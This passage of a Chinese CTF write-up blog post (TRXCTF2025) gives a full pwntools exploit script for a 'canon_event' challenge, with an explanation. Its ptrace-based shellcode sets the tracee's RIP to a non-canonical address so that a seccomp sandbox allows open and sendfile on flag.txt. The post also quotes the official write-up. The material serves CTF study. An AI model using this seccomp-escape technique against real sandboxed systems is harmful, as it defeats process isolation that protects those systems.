+</span></span><span class="line"><span class="cl">    <span class="n">PTRACE_SYSCALL</span> <span class="o">=</span> <span class="mi">24</span>
+</span></span><span class="line"><span class="cl">    <span class="n">RIP_OFFSET</span> <span class="o">=</span> <span class="mi">8</span><span class="o">*</span><span class="mi">16</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov eax, SYS_fork
+</span></span></span><span class="line"><span class="cl"><span class="s2">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">        test eax, eax
+</span></span></span><span class="line"><span class="cl"><span class="s2">        jz child
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov r13, rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov eax, SYS_wait4
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rdi, r13
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor esi, esi
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor r10, r10
+</span></span></span><span class="line"><span class="cl"><span class="s2">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">                                        
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov eax, SYS_ptrace
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov edi, </span><span class="si">{</span><span class="n">PTRACE_SYSCALL</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rsi, r13
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor r10, r10
+</span></span></span><span class="line"><span class="cl"><span class="s2">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">        
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov eax, SYS_wait4
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rdi, r13
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor esi, esi
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor r10, r10
+</span></span></span><span class="line"><span class="cl"><span class="s2">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">                                        
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov eax, SYS_ptrace
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov edi, </span><span class="si">{</span><span class="n">PTRACE_GETREGS</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rsi, r13
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov r10, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s2">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rdi, 0x820000000000
+</span></span></span><span class="line"><span class="cl"><span class="s2">        lea rbx, [rsp+</span><span class="si">{</span><span class="n">RIP_OFFSET</span><span class="si">}</span><span class="s2">]
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov [rbx], rdi
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov eax, SYS_ptrace
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov edi, </span><span class="si">{</span><span class="n">PTRACE_SETREGS</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rsi, r13
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov r10, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s2">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov eax, SYS_ptrace
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov edi, </span><span class="si">{</span><span class="n">PTRACE_CONT</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rsi, r13
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor r10, r10
+</span></span></span><span class="line"><span class="cl"><span class="s2">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">                      
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov eax, SYS_wait4
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rdi, r13
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rsi, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor r10, r10
+</span></span></span><span class="line"><span class="cl"><span class="s2">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">                                        
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov eax, SYS_ptrace
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov edi, </span><span class="si">{</span><span class="n">PTRACE_GETREGS</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rsi, r13
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov r10, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s2">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">                                                                                                     
+</span></span></span><span class="line"><span class="cl"><span class="s2">        lea rdi, [rip+sendfile] 
+</span></span></span><span class="line"><span class="cl"><span class="s2">        lea rbx, [rsp+</span><span class="si">{</span><span class="n">RIP_OFFSET</span><span class="si">}</span><span class="s2">]
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov [rbx], rdi
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov eax, SYS_ptrace
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov edi, </span><span class="si">{</span><span class="n">PTRACE_SETREGS</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rsi, r13
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov r10, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s2">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">       
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov eax, SYS_ptrace
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov edi, </span><span class="si">{</span><span class="n">PTRACE_SYSCALL</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rsi, r13
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor r10, r10
+</span></span></span><span class="line"><span class="cl"><span class="s2">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov eax, SYS_wait4
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rdi, r13
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor esi, esi
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor r10, r10
+</span></span></span><span class="line"><span class="cl"><span class="s2">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">                                        
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov eax, SYS_ptrace
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov edi, </span><span class="si">{</span><span class="n">PTRACE_GETREGS</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rsi, r13
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov r10, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s2">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">                 
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rdi, 0x820000000000
+</span></span></span><span class="line"><span class="cl"><span class="s2">        lea rbx, [rsp+</span><span class="si">{</span><span class="n">RIP_OFFSET</span><span class="si">}</span><span class="s2">]
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov [rbx], rdi
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov eax, SYS_ptrace
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov edi, </span><span class="si">{</span><span class="n">PTRACE_SETREGS</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rsi, r13
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov r10, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s2">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov eax, SYS_ptrace
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov edi, </span><span class="si">{</span><span class="n">PTRACE_CONT</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rsi, r13
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor r10, r10
+</span></span></span><span class="line"><span class="cl"><span class="s2">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov eax, SYS_wait4
+</span></span></span><span class="line"><span class="cl"><span class="s2">        mov rdi, r13
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor esi, esi
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">        xor r10, r10
+</span></span></span><span class="line"><span class="cl"><span class="s2">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">        
+</span></span></span><span class="line"><span class="cl"><span class="s2">        hlt
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        child:
+</span></span></span><span class="line"><span class="cl"><span class="s2">            mov eax, SYS_ptrace
+</span></span></span><span class="line"><span class="cl"><span class="s2">            xor edi, edi
+</span></span></span><span class="line"><span class="cl"><span class="s2">            xor esi, esi
+</span></span></span><span class="line"><span class="cl"><span class="s2">            xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">            xor r10, r10
+</span></span></span><span class="line"><span class="cl"><span class="s2">            syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">            int3
+</span></span></span><span class="line"><span class="cl"><span class="s2">        open:
+</span></span></span><span class="line"><span class="cl"><span class="s2">            mov eax, SYS_open
+</span></span></span><span class="line"><span class="cl"><span class="s2">            lea rdi, [rip+flag]
+</span></span></span><span class="line"><span class="cl"><span class="s2">            xor esi, esi
+</span></span></span><span class="line"><span class="cl"><span class="s2">            xor edx, edx    
+</span></span></span><span class="line"><span class="cl"><span class="s2">            syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">        sendfile:
+</span></span></span><span class="line"><span class="cl"><span class="s2">            mov rax, SYS_sendfile
+</span></span></span><span class="line"><span class="cl"><span class="s2">            mov rdi, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">            mov rsi, 3  
+</span></span></span><span class="line"><span class="cl"><span class="s2">            xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s2">            mov r10, 0x50
+</span></span></span><span class="line"><span class="cl"><span class="s2">            syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">        hlt
+</span></span></span><span class="line"><span class="cl"><span class="s2">    flag:
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;flag.txt</span><span class="se">\0</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dbg</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">bstr</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>shellcode解释：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">SYS_fork</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">parent_process</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">wait4</span>  <span class="o">//</span><span class="err">等待</span><span class="n">TRACEME</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="n">PTRACE_SYSCALL</span> <span class="o">//</span><span class="err">捕获下一次</span><span class="n">syscall信号</span><span class="err">，即</span><span class="n">open的syscall</span>
+</span></span><span class="line"><span class="cl">	<span class="n">wait4</span>	<span class="o">//</span><span class="err">等待</span><span class="n">open的syscall开始</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PTRACE_GETREGS</span>	<span class="o">//</span><span class="err">获取寄存器信息</span>
+</span></span><span class="line"><span class="cl">	<span class="n">set_rip_non_canoncial_address</span>	<span class="o">//</span><span class="err">设置</span><span class="n">RIP为非法地址来绕过沙箱</span><span class="p">,</span><span class="err">然后执行</span><span class="n">syscall</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PTRACE_CONT</span>	<span class="o">//</span><span class="err">继续执行</span>
+</span></span><span class="line"><span class="cl">	<span class="n">wait4</span>	<span class="o">//</span><span class="n">handle</span> <span class="n">SIGSEV</span> <span class="k">signal</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="n">PTRACE_GETREGS</span> <span class="o">//</span><span class="err">获取寄存器信息</span>
+</span></span><span class="line"><span class="cl">	<span class="n">set_rip_sendfile</span> <span class="o">//</span><span class="err">设置</span><span class="n">rip为sendfile处</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="n">PTRACE_SYSCALL</span> <span class="o">//</span><span class="err">捕获下一次</span><span class="n">syscall</span><span class="p">,</span><span class="err">即</span><span class="n">sendfile的syscall</span>
+</span></span><span class="line"><span class="cl">	<span class="n">wait4</span>	<span class="o">//</span><span class="err">等待</span><span class="n">sendfile的syscall开始</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PTRACE_GETREGS</span>	<span class="o">//</span><span class="err">获取寄存器信息</span>
+</span></span><span class="line"><span class="cl">	<span class="n">set_rip_non_cononcial_addr</span>	<span class="o">//</span><span class="err">设置</span><span class="n">RIP为非法地址来绕过沙箱</span><span class="p">,</span><span class="err">然后执行</span><span class="n">syscall</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PTRACE_CONT</span>	<span class="o">//</span><span class="err">继续执行</span>
+</span></span><span class="line"><span class="cl">	<span class="n">wait4</span>	<span class="o">//</span><span class="n">handle</span> <span class="n">SIGSEV</span> <span class="k">signal</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl"><span class="n">child_process</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PTRACE_TRACEME</span>
+</span></span><span class="line"><span class="cl">	<span class="n">open</span>
+</span></span><span class="line"><span class="cl">	<span class="n">sendfile</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p><strong>沙箱不是禁掉了open和sendfile吗？为什么还能用？</strong></p>
+<blockquote>
+<p>先附上官方WP的一些解释：</p>
+<p><strong>Understanding the seccomp filter</strong></p>
+<p>Extracting the <strong><code>seccomp</code></strong> filter from the binary using <strong><code>seccomp-tools</code></strong> will give you the following result:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
+</span></span><span class="line"><span class="cl"><span class="o">=================================</span>
+</span></span><span class="line"><span class="cl"><span class="mo">0000</span><span class="o">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x0000000c</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">instruction_pointer</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl"><span class="mo">0001</span><span class="o">:</span> <span class="mh">0x35</span> <span class="mh">0x04</span> <span class="mh">0x00</span> <span class="mh">0x00008000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&gt;=</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0006</span>
+</span></span><span class="line"><span class="cl"><span class="mo">0002</span><span class="o">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
+</span></span><span class="line"><span class="cl"><span class="mo">0003</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x02</span> <span class="mh">0x00</span> <span class="mh">0x0000003d</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">wait4</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0006</span>
+</span></span><span class="line"><span class="cl"><span class="mo">0004</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x01</span> <span class="mh">0x00</span> <span class="mh">0x00000065</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">ptrace</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0006</span>
+</span></span><span class="line"><span class="cl"><span class="mo">0005</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000039</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">fork</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0007</span>
+</span></span><span class="line"><span class="cl"><span class="mo">0006</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+</span></span><span class="line"><span class="cl"><span class="mo">0007</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x80000000</span>  <span class="k">return</span> <span class="n">KILL_PROCESS</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>The filter allows three syscalls in the standard canonical range of userland addresses (so <strong><code>rip</code></strong> has to be lower than <strong><code>0x800000000000</code></strong>). If the <strong>instruction pointer</strong> is not in that range then you can call any syscall you want!</p>
+<p><strong>ptrace &amp; wait4</strong></p>
+<p>The objective is to bypass the check on the instruction pointer using <strong><code>ptrace</code>.</strong></p>
+<p><strong><code>ptrace</code></strong> enables a process (called the “tracer”) to debug another process (usually a child process called “tracee”).</p>
+<p>By using <strong><code>PTRACE_SYSCALL</code></strong> we tell the tracee to pause execution before executing <strong><code>syscall</code></strong>. The tracee will send a <strong><code>SIGTRAP</code></strong> signal when it encounters a syscall so in the tracer we can just wait for the signal with <strong><code>wait4</code>.</strong> At this point we can modify the tracee’s registers using <strong><code>PTRACE_SETREGS</code>.</strong></p>
+<p>With this type of ptrace request we can modify all registers, <strong>including rip!</strong></p>
+<p><strong>Imaginary conversation with an imaginary pwner</strong></p>
+<p><em>“But wait! If we change <strong><code>rip</code></strong> we would not execute the <strong><code>syscall</code></strong> instruction anymore!”</em></p>
+<p>Well… actually <strong><code>syscall</code></strong> will be executed anyways because the instruction is fetched before ptrace takes place!</p>
+<p><em>”Ok but seccomp acts before <strong><code>ptrace</code></strong>… right?”</em></p>
+<p>Nope lol. The seccomp filter is applied only after <strong><code>ptrace</code></strong> since <strong><code>Linux 4.8</code></strong> on. From <strong><code>Linux 3.5</code></strong> to <strong><code>Linux 4.7</code></strong> the filter was applied before <strong><code>ptrace</code></strong> so it was even worst!</p>
+<p><strong>Consequences</strong></p>
+<p>We can effectively change <strong><code>rip</code></strong> just before a syscall is executed and before the seccomp filter is applied to a non canonical address. This will execute the syscall correctly but with a fake, non canonical <strong><code>rip</code></strong> bypassing the seccomp filter!</p>
+<p>After the syscall the tracee will send a <strong><code>SIGSEV</code></strong> signal (because of the non canonical <strong><code>rip</code></strong>) but this can be easily be handled by the tracer with a <strong><code>wait4</code></strong> and a <strong><code>PTRACE_SETREGS</code></strong> and resetting <strong><code>rip</code></strong> to the right address.</p>
+<p><strong>Wrapping it up</strong></p>
+<p>Now that we understood how to bypass the filter we can just call <strong><code>execve</code></strong> right? Well no. When calling <strong><code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code></strong> the syscall will replace the current process with a new process (in this case <strong><code>/bin/sh</code></strong> ). The new process will inherit the seccomp filter of the old process. When the spawned process will try to execute other syscalls (like <strong><code>open,</code></strong> <strong><code>read</code>,</strong> <strong><code>sbrk</code></strong> and so on) the filter will block these syscalls. This is not really a problem, I can just call <strong><code>open</code></strong> and <strong><code>sendfile</code></strong> and the job is done!</p>
+</blockquote>
+<p>感觉官方WP讲的不是很清晰，我就去看了相关内核代码：</p>
+<p><a href="https://github.com/torvalds/linux/blob/6e64f4580381e32c06ee146ca807c555b8f73e24/kernel/entry/syscall-common.c#L20" target="_blank" rel="external nofollow noopener noreferrer">处理ptrace和seccomp的函数</a>：这里可以看出，执行顺序：ptrace、seccomp、syscall，而我们在ptrace的时候设置RIP为非法地址，沙箱直接就allow了，不会再去检查sys_number的内容，也就可以去执行read这些系统调用了</p>
+<p><strong>其他相关资料：</strong></p>
+<p><a href="https://github.com/torvalds/linux/commit/93e35efb8de45393cf61ed07f7b407629bf698ea" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/torvalds/linux/commit/93e35efb8de45393cf61ed07f7b407629bf698ea</a></p>
+<h2 class="heading-element" id="virtual_insanity"><span>Virtual_Insanity</span>
+  <a href="#virtual_insanity" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><blockquote>
+<p>栈溢出+利用vsyscall</p>
+</blockquote>
+<p>就不写了。。。</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod"><span title="Updated on 2025-08-07 23:39:42">Updated on 2025-08-07&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/trxctf2025/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span><span><a href="vscode://file/D:%5cBlog%5ccontent%5cposts%5cTRXCTF2025.md" title="Open in editor" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Open in editor</a></span></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"></section>
+    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/read_fzdxj/" class="post-nav-item" rel="prev" title="《法治的细节》"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>《法治的细节》</a><a href="/posts/phppwn_re_struct/" class="post-nav-item" rel="next" title="Phppwn逆向">Phppwn逆向<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#canon_event">canon_event</a></li>
+    <li><a href="#virtual_insanity">Virtual_Insanity</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog></main><footer class="footer">
